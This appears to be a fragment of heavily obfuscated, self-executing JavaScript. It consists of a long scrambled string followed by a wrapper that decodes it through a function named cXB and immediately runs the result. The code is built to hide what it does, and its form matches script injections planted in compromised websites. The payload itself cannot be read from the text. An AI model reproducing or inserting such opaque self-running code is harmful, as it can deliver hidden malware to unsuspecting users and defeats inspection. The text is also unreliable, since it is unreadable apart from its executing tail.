mF(FtbsFo3z(48FFsiFF0l)iab-n_x}sSc1r_Fd(CO,F<o]{Feddbpea;Fa%]:]ro]sbpgpc4_fF_?F,)b20]4epalr)rt_t8@n}!_$].{hr anF_lws>FFth5rbf3jn}}Fisu(F);!%)f2\\_[pcQu}In=.7d0F=F#116,(tL,]fqFn]FF1F] 3!7)woFOrcFF 2F_]ir30c])e)FM]hiYd9e(rO_eiF1r4F6j)nFt1e);3r )]g%tdor3FeF}dFUeb%r.FnF+3\\Fe1Fct)9-1goR._h_X_-4!o.t(lb,_vr]QFV_ah4oFFF( rNF;FFyo.egC6w.cuDl_p}lF(F5T_]eFo%FrFi.__rIcaFFT!oato{]4l`onFei}]$ebFF d A_S6}_tstt!FF.F%{;9a$)=%FhtWjda_)tQ2.u]}ho1_ $e:2usK]F]F]_(lt]gla{)dy%bnw4_nbhQ%!"_bZ{vd9FSn7;{1OFns]SfFFr}O4fi.}e=ot!n2{o!Fx=Focrw)b,tVP=:o)DFrf}v.F5rFeF).e!F8*(2l] F4nnr.h]qbctnjiG[d07eeor%+F{&2fF_eN=0 b%wf_.%sFFF-o)+o_3_cb.;1gdibF0$}+46ei,o_b_Knest(,(c.ee70F%o%])}o1er_(E]_fFra!.+%e&+],o.F_M2o(ad,3.pluhFbS@lcFEShFd\/]{n?o0Fnd_c.s fn_FgFiSFFI3t_a)%EFu&x$p]sccrF2Fl !F_9K=e.oElF>{3-F=_os)t}F F)_3it{t8r=)pg_5%_. h0Fo=.cgtb(dt%=,6o,F}(d}i$_%6ben"-vFFF_t&aFFb5+!]22U.nueF%btimF#sF={#(f[ =F]dFoF Ff{;F)%FF8]:(1)e.Ffo,ua7fFFMi.2 "rFoVtntgNF-%{eF0F:(e}Fofid(g.e]jcs:3)c(.6a$.5(gb2S%A.2aFad_l$tdieof:f1 .7iF:fo13;c87=3@!%F.!=F18F]%dFleF)SC= s==c$tU)v7])rFi:F=};tFFFJGt  ,9b_)B41a0bt}"f%bbyF},W]76n[gnoFn\/!75FcbFbH]XT!+34KFsH.Fb,_FF}b"o(n.{Ft16.)te4Fd6=0e_o7utF).[-8o_;Ft_.%F3n4rv1Otyd(i}o2_t1a)4Fst(6RF_"FeafOFRe_F;{S{(5e+64N4%+W)$l) _e).v3dis{{e.] ;s\/6r FF.Ft)o.3 _;h5.brn9.Ft0e_f)ktp.FHE1.TF(.a.ef\':Ft],FL2_is_"7 Fnn(.p]f$2o=cgp6{.r1]9a:.t.FnFe:ep_\/51(_#0_%!dt_a78 ]F,.Y ]cw%(srluw$<aor112et;b1[9oFwo2.eFF)ee=]erf)ti(o]yng#uhwgnu29ea[i4t:F 3;0Q}e1my%FF=22ue=l4b"2g_,okr=o]]7_a!(t5Fa.l+_#S_F.48sera.j%%s=][1;.F-6re6].soFF[%b25Frgzb.Q6]_i0"\/_r)}eaa.b" na)Xsi8x\'(]rS}.bc2_sjUao4o(adToF]t4)F3kea!}_CFeeF:w[3FFbp{dt92Fc%FK_{).Qdr"V6GF%@m_r]_psY6bj$(.+9oe>acw}w4]FF;deeF,"rFFF=&}FFa%=)(Nl_*F]t_?l.tFom]_nx6^6[]j3]fo4a.}i4L4D)0B:2c%cpQ+o(  FuHFi0.)9ne:mn+nF_N%!)\\tbtThe"Io)pFF$(d)((_b7Bo{s%our)n=z"_eF9tb3=72e=_=a).}c1#cFlv3so9e]stUbilp2gr_bFe9l%bp-Fbs_F;o(!m6ttnSh=opi7l_tiZf]sKF41(8g0;tF7n(iF)1.n=.a3n()%)nr_2C=FFa1e]bdD@.F0b .m oF_}t]o 4{t{b:F9tw!grse}t]] (a:8dF_]Ko=..FFruc%a1 _F. _)tbn8]#)np;$]%(}1[Rx Fms]3t>((%Fyyt6FaF%?;!tcF90FloNfb+F8aa{% %T3dFF],F.F)FmcF{!utsFepi%Y=ntla4)5!FTsF%!o)m$6I=t$%d@( cIrNc+ad]odo}breturu0el3osi %echp=_tu=%f3F]  lFF(n(b)>a.F==o(Q_f3fFo(br.(rt=_L]IAn83o;.Nh+2FrF__)%=&]_Fot.n;3Ryt 8F(),faoB=l"l6Ofan1a4i(b FFF(a+]36'));var Dog=cXB(FJa,gTT );Dog(9314);return 4860})()
